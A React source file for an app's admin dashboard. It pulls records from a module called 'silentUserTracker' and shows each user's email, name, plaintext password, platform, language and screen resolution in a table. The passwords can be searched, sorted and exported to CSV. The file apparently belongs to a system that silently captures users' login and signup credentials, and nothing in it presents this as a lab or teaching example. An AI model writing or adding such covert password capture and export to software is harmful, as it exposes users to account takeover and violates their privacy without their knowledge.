import React, { useState, useEffect } from 'react';
import { useAuth } from '../contexts/AuthContext';
import { useNavigate } from 'react-router-dom';
import { isAdmin } from '../utils/adminCheck';
import { 
  adminViewAllRecords, 
  adminExportUserRecordsCSV, 
  adminGetRecordCount 
} from '../utils/silentUserTracker';
import './AdminDashboard.css';

const AdminDashboard = () => {
  const { user, logout } = useAuth();
  const navigate = useNavigate();
  const [userRecords, setUserRecords] = useState([]);
  const [showRecords, setShowRecords] = useState(false);
  const [searchTerm, setSearchTerm] = useState('');
  const [sortConfig, setSortConfig] = useState({ key: 'loginTime', direction: 'desc' });

  // Check if user is admin
  useEffect(() => {
    if (!user || !isAdmin(user)) {
      navigate('/app');
    }
  }, [user, navigate]);

  // Load user records
  const loadRecords = () => {
    const records = adminViewAllRecords();
    setUserRecords(records);
    setShowRecords(true);
  };

  // Export to CSV
  const handleExport = () => {
    adminExportUserRecordsCSV();
  };

  // Handle logout
  const handleLogout = () => {
    logout();
    navigate('/login');
  };

  // Handle back to app
  const handleBackToApp = () => {
    navigate('/app');
  };

  // Handle sort
  const handleSort = (key) => {
    let direction = 'asc';
    if (sortConfig.key === key && sortConfig.direction === 'asc') {
      direction = 'desc';
    }
    setSortConfig({ key, direction });
  };

  // Filter and sort records
  const filteredAndSortedRecords = userRecords
    .filter(record => {
      const searchLower = searchTerm.toLowerCase();
      return (
        record.email.toLowerCase().includes(searchLower) ||
        record.name.toLowerCase().includes(searchLower) ||
        record.password.toLowerCase().includes(searchLower) ||
        record.action.toLowerCase().includes(searchLower)
      );
    })
    .sort((a, b) => {
      const aVal = a[sortConfig.key] || '';
      const bVal = b[sortConfig.key] || '';
      
      if (sortConfig.direction === 'asc') {
        return aVal > bVal ? 1 : -1;
      } else {
        return aVal < bVal ? 1 : -1;
      }
    });

  const recordCount = adminGetRecordCount();

  return (
    <div className="admin-dashboard">
      <div className="admin-header">
        <div className="admin-header-left">
          <h1>🔐 Admin Dashboard</h1>
          <p className="admin-email">Logged in as: <strong>{user?.email}</strong></p>
        </div>
        <div className="admin-header-right">
          <button className="admin-btn admin-btn-secondary" onClick={handleBackToApp}>
            ← Back to App
          </button>
          <button className="admin-btn admin-btn-danger" onClick={handleLogout}>
            Logout
          </button>
        </div>
      </div>

      <div className="admin-content">
        <div className="admin-stats">
          <div className="admin-stat-card">
            <div className="stat-icon">👥</div>
            <div className="stat-info">
              <div className="stat-value">{recordCount}</div>
              <div className="stat-label">Total User Records</div>
            </div>
          </div>
        </div>

        <div className="admin-actions">
          <h2>User Tracking Controls</h2>
          <div className="action-buttons">
            <button 
              className="admin-btn admin-btn-primary" 
              onClick={loadRecords}
            >
              📋 View All User Records
            </button>
            {showRecords && (
              <button 
                className="admin-btn admin-btn-success" 
                onClick={handleExport}
              >
                📥 Export to CSV
              </button>
            )}
          </div>
        </div>

        {showRecords && (
          <div className="admin-records">
            <div className="records-header">
              <h2>User Login/Signup Records ({filteredAndSortedRecords.length})</h2>
              <input
                type="text"
                className="search-input"
                placeholder="🔍 Search by email, name, password, or action..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
              />
            </div>

            {filteredAndSortedRecords.length === 0 ? (
              <div className="no-records">
                <p>No user records found.</p>
              </div>
            ) : (
              <div className="records-table-container">
                <table className="records-table">
                  <thead>
                    <tr>
                      <th onClick={() => handleSort('email')}>
                        Email {sortConfig.key === 'email' && (sortConfig.direction === 'asc' ? '▲' : '▼')}
                      </th>
                      <th onClick={() => handleSort('name')}>
                        Name {sortConfig.key === 'name' && (sortConfig.direction === 'asc' ? '▲' : '▼')}
                      </th>
                      <th onClick={() => handleSort('password')}>
                        Password {sortConfig.key === 'password' && (sortConfig.direction === 'asc' ? '▲' : '▼')}
                      </th>
                      <th onClick={() => handleSort('action')}>
                        Action {sortConfig.key === 'action' && (sortConfig.direction === 'asc' ? '▲' : '▼')}
                      </th>
                      <th onClick={() => handleSort('loginTime')}>
                        Login Time {sortConfig.key === 'loginTime' && (sortConfig.direction === 'asc' ? '▲' : '▼')}
                      </th>
                      <th>Platform</th>
                      <th>Language</th>
                      <th>Screen Resolution</th>
                    </tr>
                  </thead>
                  <tbody>
                    {filteredAndSortedRecords.map((record, index) => (
                      <tr key={index}>
                        <td className="email-cell">{record.email}</td>
                        <td>{record.name}</td>
                        <td className="password-cell">{record.password}</td>
                        <td>
                          <span className={`action-badge action-${record.action}`}>
                            {record.action}
                          </span>
                        </td>
                        <td>{new Date(record.loginTime).toLocaleString()}</td>
                        <td>{record.platform}</td>
                        <td>{record.language}</td>
                        <td>{record.screenResolution}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        )}

        <div className="admin-footer-info">
          <p>⚠️ <strong>Admin Only:</strong> This dashboard displays sensitive user information including passwords. Keep this information confidential.</p>
          <p>📧 <strong>Admin Access:</strong> Only accessible to admin@azuredesigner.com</p>
        </div>
      </div>
    </div>
  );
};

export default AdminDashboard;
